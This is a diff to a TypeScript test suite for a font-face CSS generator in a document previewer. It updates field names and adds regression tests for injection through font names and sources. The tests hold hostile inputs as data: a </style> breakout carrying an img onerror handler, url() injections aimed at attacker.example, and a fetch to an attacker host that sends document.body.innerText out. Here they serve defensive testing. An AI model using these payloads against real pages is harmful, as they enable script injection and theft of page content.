@@ -105,7 +105,7 @@ describe('synthesizedFamilyNames', () => {
 describe('facesFromRegistryEntry', () => {
   it('wraps bare base64 as a data URL', () => {
     const [face] = facesFromRegistryEntry(dataEntry());
-    expect(face.src).toBe('url("data:font/ttf;base64,AAAA")');
+    expect(face.url).toBe('data:font/ttf;base64,AAAA');
   });
 
   it('passes a data: URL through verbatim', () => {
@@ -114,7 +114,7 @@ describe('facesFromRegistryEntry', () => {
       family: 'B',
       sources: [{ kind: 'data', data: 'data:font/otf;base64,ZZZZ' }],
     });
-    expect(face.src).toBe('url("data:font/otf;base64,ZZZZ")');
+    expect(face.url).toBe('data:font/otf;base64,ZZZZ');
   });
 
   it('skips safe, file, and google sources', () => {
@@ -148,7 +148,7 @@ describe('facesFromRegistryEntry', () => {
       sources: [{ kind: 'url', url: 'https://cdn.jsdelivr.net/f.ttf' }],
     });
     expect(faces).toHaveLength(1);
-    expect(faces[0].src).toContain('cdn.jsdelivr.net');
+    expect(faces[0].url).toContain('cdn.jsdelivr.net');
   });
 
   it('marks variable sources so synthetic rules can pin the axis', () => {
@@ -177,13 +177,14 @@ describe('googleFamiliesFor', () => {
     expect(out.map((g) => g.family)).toEqual(['Inter']);
   });
 
-  it('does not emit a Google family already backed by registry bytes', () => {
+  it('does not re-fetch a weight the registry already supplies', () => {
     const out = googleFamiliesFor(
       new Set(['Inter']),
       [{ id: 'i', family: 'Inter', sources: [{ kind: 'data', data: 'AA' }] }],
       new Set()
     );
-    expect(out).toEqual([]);
+    // The entry supplies 400 (the default), so only 700 is still missing.
+    expect(out[0].weights).toEqual([700]);
   });
 
   it('narrows weights to those the document references, plus 400/700', () => {
@@ -253,7 +254,7 @@ describe('renderFontFaceCss', () => {
     family: 'Inter',
     weight: 300,
     italic: false,
-    src: 'url("https://fonts.gstatic.com/a.woff2")',
+    url: 'https://fonts.gstatic.com/a.woff2',
   };
 
   it('emits both the canonical and synthetic rules', () => {
@@ -379,5 +380,183 @@ describe('buildPreviewFontAssets', () => {
     const { css, googleHrefs } = await buildPreviewFontAssets('{oops', {});
     expect(css).toBe('');
     expect(googleHrefs).toEqual([]);
+  });
+});
+
+describe('document-controlled strings cannot escape the <style> element', () => {
+  // The generated CSS is assigned as the text of a <style> element and then
+  // serialized with outerHTML for the preview iframe's srcdoc. <style> is HTML
+  // raw text, so a literal `</style>` anywhere inside — even mid-string —
+  // closes the element and everything after it is parsed as markup.
+  const BREAKOUT = 'A</style><img src=x onerror=alert(1)>';
+
+  it('neutralises </style> in a family name', () => {
+    const css = renderFontFaceCss([
+      {
+        family: BREAKOUT,
+        weight: 400,
+        italic: false,
+        url: 'data:font/ttf;base64,AA',
+      },
+    ]);
+    expect(css).not.toContain('</style>');
+    expect(css).not.toContain('<img');
+    // Escaped as the CSS code point, which still resolves to the same family.
+    expect(css).toContain('\\3c ');
+  });
+
+  it('neutralises </style> arriving through a registry entry end to end', () => {
+    const faces = facesFromRegistryEntry({
+      id: 'x',
+      family: BREAKOUT,
+      sources: [{ kind: 'data', data: 'AAAA' }],
+    });
+    expect(renderFontFaceCss(faces)).not.toContain('</style>');
+  });
+
+  it('rejects a data payload that tries to append a second source', () => {
+    // `"),url("https://attacker/x.ttf` would otherwise close the url() and add
+    // a source the host allowlist never saw.
+    const faces = facesFromRegistryEntry({
+      id: 'evil',
+      family: 'Evil',
+      sources: [
+        {
+          kind: 'data',
+          data: 'data:font/ttf;base64,AA"),url("https://attacker.example/x.ttf',
+        },
+      ],
+    });
+    expect(faces).toEqual([]);
+  });
+
+  it('rejects a data payload outside the base64 alphabet', () => {
+    expect(
+      facesFromRegistryEntry({
+        id: 'e',
+        family: 'E',
+        sources: [{ kind: 'data', data: 'javascript:alert(1)' }],
+      })
+    ).toEqual([]);
+  });
+
+  it('escapes a quote in an allowlisted url rather than trusting the host check', () => {
+    // new URL() happily accepts a quote in the path, so an allowlisted host is
+    // not on its own enough to interpolate the string unquoted.
+    const css = renderFontFaceCss([
+      {
+        family: 'Q',
+        weight: 400,
+        italic: false,
+        url: 'https://fonts.gstatic.com/a").url("https://attacker.example/x.ttf',
+      },
+    ]);
+    // The quotes are escaped, so the second url( sits INSIDE the string
+    // literal and is inert rather than becoming an un-allowlisted source.
+    expect(css).not.toContain('"),url("');
+    expect(css).toContain('a\\").url(\\"https');
+  });
+
+  it('drops a Google-derived src containing a angle bracket', () => {
+    const css = renderFontFaceCss([
+      { family: 'G', weight: 400, italic: false, src: 'url(x)</style><b>' },
+    ]);
+    expect(css).toBe('');
+  });
+
+  it('ignores a malformed unicode-range from the stylesheet', () => {
+    const faces = parseGoogleCss(
+      "@font-face{font-family:'I';font-weight:400;src:url(https://fonts.gstatic.com/a.woff2);unicode-range:</style><img>;}",
+      'I'
+    );
+    expect(faces[0].unicodeRange).toBeUndefined();
+  });
+});
+
+describe('embedding a font does not cost the family its other weights', () => {
+  const embedded400: FontRegistryEntry = {
+    id: 'Inter',
+    family: 'Inter',
+    sources: [{ kind: 'data', data: 'AAAA', weight: 400 }],
+  };
+
+  it('still fetches a referenced weight the registry does not supply', () => {
+    // The Custom tab embeds 400/700; a fontWeight:500 run would otherwise
+    // have no face at all, which is worse than before the font was added.
+    const out = googleFamiliesFor(
+      new Set(['Inter']),
+      [embedded400],
+      new Set([500])
+    );
+    expect(out).toHaveLength(1);
+    expect(out[0].weights).toContain(500);
+    expect(out[0].weights).not.toContain(400); // already has real bytes
+  });
+
+  it('skips the family entirely once every used weight has bytes', () => {
+    const full: FontRegistryEntry = {
+      id: 'Inter',
+      family: 'Inter',
+      sources: [
+        { kind: 'data', data: 'A', weight: 400 },
+        { kind: 'data', data: 'B', weight: 700 },
+      ],
+    };
+    expect(googleFamiliesFor(new Set(['Inter']), [full], new Set())).toEqual(
+      []
+    );
+  });
+
+  it('leaves a non-catalog custom family alone', () => {
+    const brand: FontRegistryEntry = {
+      id: 'b',
+      family: 'Acme Brand Sans',
+      sources: [{ kind: 'data', data: 'A', weight: 400 }],
+    };
+    expect(
+      googleFamiliesFor(new Set(['Acme Brand Sans']), [brand], new Set([500]))
+    ).toEqual([]);
+  });
+});
+
+describe('the reported break-out, through the public entry point', () => {
+  it('produces CSS that cannot close the <style> element', async () => {
+    // Verbatim shape from the review finding: an unreferenced registry entry
+    // is still emitted, so the document does not even need to use the font.
+    const json = JSON.stringify({
+      name: 'docx',
+      props: {
+        fontRegistry: [
+          {
+            id: 'a',
+            family:
+              "A</style><img src=x onerror=fetch('https://attacker/'+encodeURIComponent(document.body.innerText))>",
+            sources: [{ kind: 'data', data: 'AA' }],
+          },
+        ],
+      },
+      children: [],
+    });
+    const failFetch = (async () => {
+      throw new Error('no network');
+    }) as unknown as typeof fetch;
+
+    const { css } = await buildPreviewFontAssets(
+      json,
+      {},
+      {
+        fetchImpl: failFetch,
+      }
+    );
+
+    // The CSS becomes the text of a <style>, which HTML serializes verbatim.
+    // The payload survives as inert text — that is fine and expected. What
+    // matters is that no `<` survives unescaped, so no tag can ever form:
+    // "onerror" is only dangerous once something opens an element.
+    expect(css).not.toContain('<');
+    expect(css).toContain('\\3c /style>');
+    // Serialized into a <style>, exactly one closing tag exists: ours.
+    const serialized = `<style>${css}</style>`;
+    expect(serialized.match(/<\/style>/g)).toHaveLength(1);
   });
 });
